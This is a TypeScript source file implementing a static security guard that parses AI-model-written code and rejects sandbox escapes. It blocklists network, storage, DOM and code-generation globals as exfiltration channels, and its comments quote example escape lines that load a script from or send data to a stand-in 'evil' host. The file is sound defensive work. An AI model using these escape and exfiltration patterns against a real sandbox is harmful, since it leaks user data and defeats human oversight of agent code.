/**
 * guard.ts – static security check for model-generated code.
 *
 * Two entry points, one set of rules:
 *
 *   guardCode(source)    the `evaluate` tool – a JavaScript body that runs
 *                        against the app's API object
 *   guardScript(source)  a TypeScript source file the model writes for the
 *                        host's own scripting environment (classes, types,
 *                        `this`) – see "Scripting" below
 *
 * ── Threat model ─────────────────────────────────────────────────────────────
 *
 * The model writes code that we execute in the browser. For `evaluate` that
 * code runs inside `with (api) { ... }`, which makes the API functions look
 * like globals. `with` is ergonomics, never security: any identifier the API
 * does not define falls through to the real global scope.
 *
 * The guard parses the code with acorn and rejects it *before* the first
 * statement runs if it contains a known escape vector. It is a blocklist: it
 * names what is forbidden and lets everything else through.
 *
 * ── Why a blocklist ──────────────────────────────────────────────────────────
 *
 * The alternative is an allowlist of identifiers: resolve every name against
 * the API's keys plus a few safe built-ins, reject the rest. It fails closed on
 * unknown globals, which is strictly stronger – but it has to know the API's
 * names, and in a real app it cannot: the API is a deep object tree, it grows
 * during the session, it hides behind getters and proxies. An allowlist that
 * does not know the real surface rejects legitimate calls, and a guard that
 * blocks the app's own API gets switched off – which protects nothing.
 *
 * So the guard restricts *language constructs*, not the app's vocabulary, and
 * the security boundary sits where it belongs: on the API object. See "Limits".
 *
 * ── Scripting ────────────────────────────────────────────────────────────────
 *
 * An app whose users write scripts will want the agent to write them too. That
 * source is TypeScript, uses classes, and therefore uses `this` – guardCode
 * would reject every line of it. guardScript parses TypeScript and permits
 * classes, but applies the *same* blocklists: no window, no fetch, no eval, no
 * dynamic import.
 *
 * One condition, and it is not optional: **the host must execute the script in
 * strict mode** (as an ES module, or with a "use strict" prologue). In sloppy
 * mode a plain function call binds `this` to globalThis, and `this.fetch(...)`
 * walks straight around the blocklist.
 *
 * ── Limits – read this ───────────────────────────────────────────────────────
 *
 * A blocklist is incomplete by construction: every global nobody thought of is
 * reachable. Treat the guard as a strong barrier against a model that goes off
 * the rails, not as a sandbox that contains an adversary. The real boundary is
 * the API you hand to the model: it can do what your API can do.
 */
import * as acorn from "acorn";
import { tsPlugin } from "acorn-typescript";

// acorn-typescript's types are declared against its own acorn copy; the runtime
// contract (an acorn plugin) is what matters here.
const TypeScriptParser = acorn.Parser.extend(tsPlugin() as any);

export interface GuardOptions {
  /** Identifiers to reject on top of the built-in list, e.g. your own globals. */
  extraBlocked?: string[];
  /** Names to permit despite being blocked by default. Use sparingly. */
  allowBlocked?: string[];
  /** Max source length in characters (default 10000, scripts 40000). */
  maxLength?: number;
  /** Max AST nodes, a cheap ceiling on complexity (default 2500, scripts 10000). */
  maxNodes?: number;
}

export interface ScriptGuardOptions extends GuardOptions {
  /**
   * Module specifiers a static `import` may name. Anything else is rejected –
   * an unrestricted import is an escape (`import "https://evil.example/x.js"`).
   * Empty (the default) forbids imports entirely.
   */
  allowImportsFrom?: string[];
}

export interface GuardResult {
  ok: boolean;
  /** Why the code was rejected. Written for the model – it is fed back verbatim. */
  reason?: string;
  /** Position in the original source (1-based line, 0-based column). */
  at?: { line: number; column: number };
}

/** Language constructs with no legitimate use here and a proven escape history. */
const BLOCKED_NODES: Record<string, string> = {
  ThisExpression: "`this` is not available – call the API functions directly.",
  ImportExpression: "Dynamic import() is not allowed.",
  MetaProperty: "`import.meta` / `new.target` are not allowed.",
  WithStatement: "`with` is not allowed.",
  TaggedTemplateExpression: "Tagged templates are not allowed – use plain strings.",
  DebuggerStatement: "`debugger` is not allowed.",
};

/**
 * Identifiers that must never be referenced: names that reach the function
 * constructor (and thus arbitrary code), and names that reach the outside world
 * (network, storage, DOM) – the exfiltration channels.
 */
const BLOCKED_IDENTIFIERS = new Set([
  // Scope escape / code generation
  "arguments",
  "eval",
  "Function",
  "AsyncFunction",
  "GeneratorFunction",
  "AsyncGeneratorFunction",
  "constructor",
  "Proxy",
  "Reflect",
  "WebAssembly",

  // The global object, by any of its names
  "globalThis",
  "window",
  "self",
  "global",
  "top",
  "parent",
  "opener",
  "frames",

  // DOM / browsing context
  "document",
  "location",
  "navigator",
  "history",
  "customElements",

  // Network: the channels that turn a bug into a data leak
  "fetch",
  "XMLHttpRequest",
  "WebSocket",
  "EventSource",
  "Image", // new Image().src = "https://evil/?" + data
  "Audio",
  "Worker",
  "SharedWorker",
  "BroadcastChannel",
  "MessageChannel",
  "RTCPeerConnection",
  "postMessage",
  "importScripts",
  "open",

  // Storage
  "localStorage",
  "sessionStorage",
  "indexedDB",
  "caches",
  "cookieStore",

  // Timers: setTimeout("code") evaluates its string argument
  "setTimeout",
  "setInterval",
  "setImmediate",

  // Native dialogs – the model talks through the chat, not through a popup
  "alert",
  "confirm",
  "prompt",
  "print",

  // Module systems
  "require",
  "module",
  "exports",
  "process",
]);

/**
 * Property names that walk from any value back to the Function constructor,
 * and from there to arbitrary code. Blocked in both `a.b` and `a["b"]` form.
 */
const BLOCKED_PROPERTIES = new Set([
  "constructor",
  "prototype",
  "__proto__",
  "getPrototypeOf",
  "setPrototypeOf",
  "__defineGetter__",
  "__defineSetter__",
  "__lookupGetter__",
  "__lookupSetter__",
]);

/**
 * Fields that hold *types*, not values. `let element: Window` names the global
 * Window in a type position – it compiles to nothing and executes nothing, so
 * checking it would be a false rejection.
 */
const TYPE_FIELDS = new Set([
  "typeAnnotation",
  "typeParameters",
  "typeArguments",
  "returnType",
  "superTypeArguments",
  "superTypeParameters",
  "implements",
]);

/** Declarations that are erased at compile time and cannot execute anything. */
const TYPE_ONLY_NODES = new Set([
  "TSInterfaceDeclaration",
  "TSTypeAliasDeclaration",
  "TSDeclareFunction",
  "TSAbstractMethodDefinition",
]);

// The evaluate body is wrapped so top-level `return` and `await` parse. The
// wrapper ends in a newline, so the code starts on line 2 – hence lineOffset 1.
const WRAPPER_PREFIX = "(async function __checked__() {\n";

/**
 * Checks a JavaScript body written for the `evaluate` tool.
 * Never throws: a parse error is reported as a rejection, because that is a
 * message the model can act on.
 */
export function guardCode(source: string, options: GuardOptions = {}): GuardResult {
  const { maxLength = 10_000, maxNodes = 2500 } = options;

  const tooLong = checkLength(source, maxLength);
  if (tooLong) return tooLong;

  let ast: acorn.Node;
  try {
    ast = acorn.parse(WRAPPER_PREFIX + source + "\n})", {
      ecmaVersion: 2022,
      sourceType: "script",
      locations: true,
    });
  } catch (error: any) {
    return { ok: false, reason: `Syntax error: ${error?.message ?? String(error)}` };
  }

  return run(ast, {
    blocked: blocklistFor(options),
    blockedNodes: BLOCKED_NODES,
    maxNodes,
    lineOffset: 1,
    allowImportsFrom: [],
  });
}

/**
 * Checks a TypeScript source file the model wrote for the host's scripting
 * environment. Classes and `this` are permitted; everything else is judged by
 * the same rules as guardCode.
 *
 * The host MUST run the result in strict mode – as an ES module, or behind a
 * "use strict" prologue. In sloppy mode `this` is globalThis in a plain call,
 * and the blocklist is worth nothing.
 */
export function guardScript(source: string, options: ScriptGuardOptions = {}): GuardResult {
  const { maxLength = 40_000, maxNodes = 10_000, allowImportsFrom = [] } = options;

  const tooLong = checkLength(source, maxLength);
  if (tooLong) return tooLong;

  let ast: acorn.Node;
  try {
    ast = TypeScriptParser.parse(source, {
      ecmaVersion: 2022,
      sourceType: "module", // top-level await, import/export, and strict by default
      locations: true,
    });
  } catch (error: any) {
    return { ok: false, reason: `Syntax error: ${error?.message ?? String(error)}` };
  }

  // `this` is what classes are made of, so it cannot be blocked here. It is
  // safe only because a module is strict-mode code – see the doc comment.
  const { ThisExpression: _dropped, ...blockedNodes } = BLOCKED_NODES;

  return run(ast, {
    blocked: blocklistFor(options),
    blockedNodes,
    maxNodes,
    lineOffset: 0,
    allowImportsFrom,
  });
}

function checkLength(source: string, maxLength: number): GuardResult | null {
  if (typeof source !== "string") return { ok: false, reason: "Code must be a string." };
  if (source.length > maxLength) {
    return {
      ok: false,
      reason:
        `Code is too long (${source.length} characters, limit ${maxLength}). ` +
        `Split the work into smaller pieces.`,
    };
  }
  return null;
}

function blocklistFor(options: GuardOptions): Set<string> {
  const blocked = new Set(BLOCKED_IDENTIFIERS);
  for (const name of options.extraBlocked ?? []) blocked.add(name);
  for (const name of options.allowBlocked ?? []) blocked.delete(name);
  return blocked;
}

function run(ast: acorn.Node, config: Config): GuardResult {
  try {
    new Checker(config).visit(ast, null, new Scope(null));
    return { ok: true };
  } catch (violation) {
    if (violation instanceof Violation) {
      return { ok: false, reason: violation.reason, at: violation.at };
    }
    throw violation;
  }
}

// ── Scope tracking ────────────────────────────────────────────────────────────

type Node = any;

interface Config {
  blocked: Set<string>;
  blockedNodes: Record<string, string>;
  maxNodes: number;
  lineOffset: number;
  allowImportsFrom: string[];
}

/**
 * A blocked name only means the *global* of that name. `open`, `parent`, `top`
 * and `self` are ordinary variable names, and the model will use them:
 *
 *   const open = tasks.filter((t) => !t.done);   // nothing to do with window.open
 *
 * So the guard tracks what the code declares, and a blocked identifier is only
 * a violation as a *free* reference. A declared name cannot reach the global it
 * shadows, and rejecting it would be a false positive on ordinary code – the
 * failure mode that makes people turn a guard off.
 */
class Scope {
  readonly names = new Set<string>();
  constructor(readonly parent: Scope | null) {}

  declare(name: string) {
    this.names.add(name);
  }

  has(name: string): boolean {
    for (let scope: Scope | null = this; scope; scope = scope.parent) {
      if (scope.names.has(name)) return true;
    }
    return false;
  }
}

class Checker {
  private count = 0;

  constructor(private readonly config: Config) {}

  visit(node: Node, parent: Node, scope: Scope): void {
    if (!node || typeof node !== "object" || typeof node.type !== "string") return;

    // Types are erased before anything runs; an identifier in a type position
    // is not a reference to the global of that name.
    if (TYPE_ONLY_NODES.has(node.type)) return;

    if (++this.count > this.config.maxNodes) {
      throw new Violation(
        `Code is too complex (over ${this.config.maxNodes} syntax nodes). Split the work.`,
        node,
        this.config.lineOffset
      );
    }

    const blockedNode = this.config.blockedNodes[node.type];
    if (blockedNode) throw new Violation(blockedNode, node, this.config.lineOffset);

    if (node.type === "ImportDeclaration") this.checkImport(node);

    if (
      node.type === "Identifier" &&
      this.config.blocked.has(node.name) &&
      isReference(node, parent) &&
      !scope.has(node.name)
    ) {
      throw new Violation(
        `"${node.name}" is not allowed. Use only the documented API and plain code.`,
        node,
        this.config.lineOffset
      );
    }

    if (node.type === "MemberExpression") this.checkMemberAccess(node);

    if (isFunction(node)) {
      const inner = new Scope(scope);
      if (node.id?.name) inner.declare(node.id.name);
      for (const param of node.params ?? []) declarePattern(param, inner);
      if (node.body?.type === "BlockStatement") hoistVars(node.body, inner);
      this.visitChildren(node, inner);
      return;
    }

    if (node.type === "BlockStatement" || isLoop(node) || node.type === "SwitchStatement") {
      const inner = new Scope(scope);
      declareBlockBindings(node, inner);
      this.visitChildren(node, inner);
      return;
    }

    if (node.type === "CatchClause") {
      const inner = new Scope(scope);
      if (node.param) declarePattern(node.param, inner);
      this.visitChildren(node, inner);
      return;
    }

    if (node.type === "VariableDeclarator") {
      // Declare before the initialiser is visited, so `const parent = x.parent`
      // does not trip over its own name.
      declarePattern(node.id, scope);
    }

    this.visitChildren(node, scope);
  }

  private visitChildren(node: Node, scope: Scope): void {
    for (const key of Object.keys(node)) {
      if (key === "type" || key === "loc" || key === "start" || key === "end") continue;
      if (TYPE_FIELDS.has(key)) continue;

      const child = node[key];
      if (Array.isArray(child)) {
        for (const item of child) this.visit(item, node, scope);
      } else {
        this.visit(child, node, scope);
      }
    }
  }

  /** A free import is an escape: `import "https://evil.example/x.js"` runs it. */
  private checkImport(node: Node): void {
    const specifier = String(node.source?.value ?? "");
    if (!this.config.allowImportsFrom.includes(specifier)) {
      const allowed = this.config.allowImportsFrom.length
        ? `Allowed: ${this.config.allowImportsFrom.join(", ")}.`
        : "Imports are not allowed here.";
      throw new Violation(
        `Cannot import from "${specifier}". ${allowed}`,
        node,
        this.config.lineOffset
      );
    }
  }

  /**
   * Property access is where the constructor chain lives.
   *
   * Static:    obj.constructor            → checked against BLOCKED_PROPERTIES
   * Computed:  obj[0], obj[i], obj["key"] → allowed (string literals are checked)
   *            obj["constr" + "uctor"]    → rejected: a key computed from an
   *            obj[keys[j]], obj[fn()]      expression can spell out anything at
   *                                         runtime, so it cannot be checked here.
   *
   * If the model genuinely needs a dynamic lookup over an app object tree, give
   * it an API function (`getProperty(obj, name)`) that validates the name.
   */
  private checkMemberAccess(node: Node): void {
    const offset = this.config.lineOffset;

    if (!node.computed) {
      const name = node.property?.name;
      if (name && BLOCKED_PROPERTIES.has(name)) {
        throw new Violation(`Accessing .${name} is not allowed.`, node.property, offset);
      }
      return;
    }

    const key = node.property;
    if (key?.type === "Literal") {
      if (typeof key.value === "number") return;
      if (typeof key.value === "string") {
        if (BLOCKED_PROPERTIES.has(key.value)) {
          throw new Violation(`Accessing ["${key.value}"] is not allowed.`, key, offset);
        }
        return;
      }
    }
    if (key?.type === "Identifier") return; // items[i] – the identifier is checked on its own

    throw new Violation(
      'Computed property access must be a plain name, number or string literal ' +
        '(items[i], items[0], obj["name"]) – not an expression.',
      key ?? node,
      offset
    );
  }
}

/** Declares `let`/`const`/`class`/`function` of one block, plus loop bindings. */
function declareBlockBindings(block: Node, scope: Scope): void {
  const statements = Array.isArray(block.body) ? block.body : [];
  for (const statement of statements) {
    if (statement?.type === "VariableDeclaration") {
      for (const declarator of statement.declarations) declarePattern(declarator.id, scope);
    } else if (
      statement?.type === "FunctionDeclaration" ||
      statement?.type === "ClassDeclaration"
    ) {
      if (statement.id?.name) scope.declare(statement.id.name);
    }
  }
  for (const part of [block.left, block.init]) {
    if (part?.type === "VariableDeclaration") {
      for (const declarator of part.declarations) declarePattern(declarator.id, scope);
    }
  }
}

/**
 * Hoists `var` and function declarations to the function scope, without
 * descending into nested functions – those have their own.
 */
function hoistVars(node: Node, scope: Scope): void {
  if (!node || typeof node !== "object" || typeof node.type !== "string") return;
  if (isFunction(node)) return;

  if (node.type === "VariableDeclaration" && node.kind === "var") {
    for (const declarator of node.declarations) declarePattern(declarator.id, scope);
  }
  if (node.type === "FunctionDeclaration" && node.id?.name) {
    scope.declare(node.id.name);
  }

  for (const key of Object.keys(node)) {
    if (key === "type" || key === "loc" || key === "start" || key === "end") continue;
    const child = node[key];
    if (Array.isArray(child)) {
      for (const item of child) hoistVars(item, scope);
    } else {
      hoistVars(child, scope);
    }
  }
}

/** Declares every binding a pattern introduces, including TS parameter properties. */
function declarePattern(pattern: Node, scope: Scope): void {
  if (!pattern || typeof pattern !== "object") return;
  switch (pattern.type) {
    case "Identifier":
      scope.declare(pattern.name);
      return;
    case "ObjectPattern":
      for (const property of pattern.properties) {
        declarePattern(property.type === "RestElement" ? property.argument : property.value, scope);
      }
      return;
    case "ArrayPattern":
      for (const element of pattern.elements) declarePattern(element, scope);
      return;
    case "AssignmentPattern":
      declarePattern(pattern.left, scope);
      return;
    case "RestElement":
      declarePattern(pattern.argument, scope);
      return;
    case "TSParameterProperty": // constructor(private depth: number)
      declarePattern(pattern.parameter, scope);
      return;
  }
}

function isFunction(node: Node): boolean {
  return (
    node.type === "FunctionDeclaration" ||
    node.type === "FunctionExpression" ||
    node.type === "ArrowFunctionExpression"
  );
}

function isLoop(node: Node): boolean {
  return (
    node.type === "ForStatement" ||
    node.type === "ForOfStatement" ||
    node.type === "ForInStatement"
  );
}

/**
 * True when an identifier is used as a *name in its own right* rather than as a
 * property, an object key or a label. `task.location` is a field on the app's
 * data and has nothing to do with the global `location`.
 */
function isReference(node: Node, parent: Node): boolean {
  if (!parent) return true;

  switch (parent.type) {
    case "MemberExpression":
      return parent.computed || parent.property !== node;
    case "Property":
      return parent.computed || parent.key !== node || parent.shorthand;
    case "MethodDefinition":
    case "PropertyDefinition":
      return parent.computed || parent.key !== node;
    case "LabeledStatement":
    case "BreakStatement":
    case "ContinueStatement":
      return parent.label !== node;
    default:
      return true;
  }
}

class Violation {
  readonly at?: { line: number; column: number };
  constructor(
    readonly reason: string,
    node: Node,
    lineOffset: number
  ) {
    const start = node?.loc?.start;
    if (start) this.at = { line: Math.max(1, start.line - lineOffset), column: start.column };
  }
}
